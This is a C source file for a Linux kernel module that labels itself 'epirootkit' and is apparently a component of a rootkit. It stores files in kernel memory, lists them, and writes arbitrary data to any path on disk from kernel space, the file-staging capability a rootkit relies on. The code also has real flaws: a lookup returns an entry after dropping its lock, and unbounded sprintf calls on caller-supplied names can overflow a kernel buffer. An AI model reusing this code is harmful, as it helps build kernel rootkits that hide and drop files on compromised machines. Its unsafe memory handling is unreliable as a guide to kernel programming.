#include "cache.h"

LIST_HEAD(fichiers_caches);
DEFINE_SPINLOCK(fichiers_lock);

int ajouter_fichier_cache(const char *nom, const unsigned char *donnees, size_t taille)
{
    struct fichier_cache *nouveau;
    
    nouveau = kmalloc(sizeof(struct fichier_cache), GFP_KERNEL);
    if (!nouveau)
        return -ENOMEM;
    
    strncpy(nouveau->nom, nom, 255);
    nouveau->nom[255] = 0;
    
    nouveau->donnees = kmalloc(taille, GFP_KERNEL);
    if (!nouveau->donnees) {
        kfree(nouveau);
        return -ENOMEM;
    }
    
    memcpy(nouveau->donnees, donnees, taille);
    nouveau->taille = taille;
    nouveau->crc = crc32(0, donnees, taille);
    
    spin_lock(&fichiers_lock);
    list_add(&nouveau->liste, &fichiers_caches);
    spin_unlock(&fichiers_lock);
    
    return 0;
}

struct fichier_cache *trouver_fichier_cache(const char *nom)
{
    struct fichier_cache *f;
    
    spin_lock(&fichiers_lock);
    list_for_each_entry(f, &fichiers_caches, liste) {
        if (strcmp(f->nom, nom) == 0) {
            spin_unlock(&fichiers_lock);
            return f;
        }
    }
    spin_unlock(&fichiers_lock);
    
    return NULL;
}

void liberer_fichiers_caches(void)
{
    struct fichier_cache *f, *temp;
    
    spin_lock(&fichiers_lock);
    list_for_each_entry_safe(f, temp, &fichiers_caches, liste) {
        list_del(&f->liste);
        kfree(f->donnees);
        kfree(f);
    }
    spin_unlock(&fichiers_lock);
}

char *lister_fichiers_caches(void)
{
    struct fichier_cache *f;
    char *liste;
    int pos = 0;
    
    liste = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
    if (!liste)
        return NULL;
    
    memset(liste, 0, TAILLE_BUFFER);
    strncpy(liste, "Fichiers stockes en memoire:\n", TAILLE_BUFFER - 1);
    pos = strlen(liste);
    
    spin_lock(&fichiers_lock);
    list_for_each_entry(f, &fichiers_caches, liste) {
        int written = snprintf(liste + pos, TAILLE_BUFFER - pos, 
                              "- %s (%zu octets)\n", 
                              f->nom, f->taille);
        if (written > 0)
            pos += written;
    }
    spin_unlock(&fichiers_lock);
    
    return liste;
}

char *extraire_fichier_cache(const char *nom)
{
    struct fichier_cache *f;
    char *message;
    
    f = trouver_fichier_cache(nom);
    if (!f) {
        message = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
        if (message)
            sprintf(message, "Erreur: fichier '%s' non trouve", nom);
        return message;
    }
    
    message = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
    if (!message)
        return NULL;
    
    sprintf(message, "Contenu binaire de %s (%zu octets)", f->nom, f->taille);
    return message;
}

int cacher_fichier_fs(const char *nom, const unsigned char *donnees, size_t taille, const char *chemin)
{
    struct file *f;
    int ret = 0;
    loff_t pos = 0;
    
    pr_info("epirootkit: Ecriture du fichier %s a %s (%zu octets)\n", nom, chemin, taille);
    
    f = filp_open(chemin, O_WRONLY | O_CREAT, 0644);
    if (IS_ERR(f)) {
        pr_err("epirootkit: Erreur ouverture fichier: %ld\n", PTR_ERR(f));
        return PTR_ERR(f);
    }
    
    ret = kernel_write(f, donnees, taille, &pos);
    pr_info("epirootkit: Octets ecrits: %d\n", ret);
    
    filp_close(f, NULL);
    
    return ret;
}
